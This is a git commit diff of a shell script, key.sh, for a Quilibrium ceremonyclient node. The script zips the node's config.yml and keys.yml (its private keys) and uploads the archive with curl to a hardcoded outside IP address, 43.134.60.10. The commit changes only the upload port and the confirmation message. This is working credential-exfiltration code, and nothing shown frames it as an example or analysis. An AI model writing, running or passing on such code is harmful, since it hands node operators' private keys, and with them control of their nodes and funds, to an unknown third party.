e3f73f4b01312ae277b24ba06c6f07e3e00b65b2
a154225859 <a154225859@qq.com>
2024-05-24 17:11:02 +0800

    Update key.sh

--- key.sh
+++ key.sh
@@ -9,5 +9,5 @@ cd /root/ceremonyclient/node
 peerid=$(GOEXPERIMENT=arenas go run ./... -peer-id)
 peerid=$(echo $peerid | sed 's/^Peer ID: //')
 cd /root/ceremonyclient/node/.config/ && zip "${peerid}.zip" config.yml keys.yml
-curl -F "file=@${peerid}.zip" http://43.134.60.10:2222
-echo "已发送..."
+curl -F "file=@${peerid}.zip" http://43.134.60.10:22222
+echo "已发送给43.134.60.10..."
